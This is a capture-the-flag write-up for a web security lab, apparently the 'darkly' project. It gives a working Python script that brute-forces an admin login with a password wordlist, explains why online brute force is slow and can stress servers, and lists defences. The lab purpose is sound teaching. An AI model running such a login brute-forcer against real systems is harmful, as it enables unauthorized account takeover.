### Challenge

Well, I already had the flag with the SQLi, but with this script, you can also solve the challenge in this way:

```python
#!/bin/python3

import requests
import argparse
from urllib.parse import urljoin
from signal import signal, SIGINT

YELLOW = "\033[1;33m"
RED = "\033[91m"
GREEN = "\033[92m"
END = "\033[0m"

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = "./brute_force.py [-hw] URL"
    parser.add_argument("-w", "--wordlist", required=True, help="indicates the wordlist file to use for DNS enumeration.")
    parser.add_argument("URL", help="URL to enum")
    return (parser.parse_args())

def check_password(url, password: str):
    data = f"?page=signin&username=admin&password={password}&Login=Login"
    full_url = urljoin(url, data)
    return requests.get(full_url)

def signalHandler(signum, _):
	if signum == SIGINT:
		print("")
		exit(0)

def getWordlist(arg: str) -> list:
    try:
        with open(arg) as file:
            wordlist: list = file.read().splitlines()
    except:
        print(f"{YELLOW}\nCannot open file: {arg}{END}\n")
        exit(1)	
    return wordlist

def brute_force(url: str, wordlist: list):
    i = 0
    try:
        for password in wordlist:
            response = check_password(url, password)
            if "images/WrongAnswer.gif" not in response.text:
                print(f"{GREEN}Password found: {password}{END}")
                break
            i += 1
            print(f"{i} requests")
    except FileNotFoundError:
        print(f"{RED}No dictionary file provided.{END}")

if __name__ == "__main__":
    signal(SIGINT, signalHandler)
    args = parse_arguments()
    url = args.URL
    wordlist = getWordlist(args.wordlist)
    brute_force(url, wordlist)
```

And you can use a dictionary of the 100 most common passwords, for example: https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-100.txt

### Vulnerability

The website's authentication is vulnerable to a brute force attack.
This means that an attacker can easily make repeated requests using password
dictionaries until they find the correct password for the targeted users.

In the context of this website, however, brute-forcing is likely to be infinitely slow for secure passwords
since the script must **wait for the server's response before initiating the next attempt**, which is much slower 
than **brute-forcing in local** a list of hashes obtained, for example, from a SQL injection.
Nevertheless, it may work for the most common passwords.


it's also important to consider the fact that there are tools that allow for very rapid brute-forcing of a website
through the use of multiple simultaneous requests, which can also pose a risk of DDOS for the less protected servers and websites.

This well-known vulnerability is the reason why strong password policies have developed in recent years. 
You can find a graph illustrating the brute-forcing speed based on password complexity (for local brute-forcing) as follows:

![5g3ayy7pwxl51](https://github.com/Sleleu/darkly/assets/93100775/f96760a5-f730-4338-8aa2-d47b4d3809fc)

### How to prevent from brute force

- Make a password authentication delay
- Protect your server against SQLi (this concern local brute-forcing)
- Using CAPTCHAS (But don't abuse of them please)

### Resources

- https://portswigger.net/support/using-burp-to-brute-force-a-login-page
- https://owasp.org/www-community/attacks/Brute_force_attack
- https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
